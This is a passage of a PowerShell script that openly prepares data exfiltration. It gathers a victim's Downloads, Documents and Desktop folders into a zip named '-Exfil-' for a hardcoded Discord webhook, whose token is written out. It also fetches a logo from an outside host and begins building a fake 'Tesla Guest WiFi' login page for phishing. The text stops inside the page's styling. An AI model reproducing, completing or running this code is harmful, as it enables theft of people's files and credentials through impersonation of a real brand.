# Configuration
$hook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
$userFolders = @("$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop")
$zipName = "$env:COMPUTERNAME-Exfil-$(Get-Date -f yyyy-MM-dd_hh-mm).zip"
$tempPath = "$env:TEMP\$zipName"
$stagingDir = "$env:TEMP\ExfilStaging_$(Get-Random)"
$logoUrl = "https://pplx-res.cloudinary.com/image/private/user_uploads/66352874/QJLmYFWgVIOuiyR/tesla-logo.jpg"
$logoPath = "$stagingDir\tesla-logo.jpg"

try {
    # Create staging directory and copy all files from each folder
    New-Item -Path $stagingDir -ItemType Directory -Force | Out-Null
    
    # Download Tesla logo
    try {
        Invoke-WebRequest -Uri $logoUrl -OutFile $logoPath -ErrorAction Stop
        Write-Output "Tesla logo downloaded successfully."
    }
    catch {
        Write-Output "Failed to download Tesla logo: $_"
    }
    
    # Create HTML file with Tesla logo
    $htmlContent = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Guest WiFi - Authentication Required</title>
    <style>
        :root {
            --tesla-red: #e31937;
            --dark-bg: #181818;
            --input-bg: #232323;
        }
        
        body {
            background: #000;
            color: #fff;
            font-family: 'Inter', system-ui, sans-serif;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .container {
            background: var(--dark-bg);
            padding: 2rem;
            border-radius: 12px;
            margin-top: 5vh;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }

        .tesla-header {
            text-align: center;
            margin-bottom: 2rem;
        }

        .tesla-logo {
            width: 120px;
            margin: 2rem auto;
            display: block;
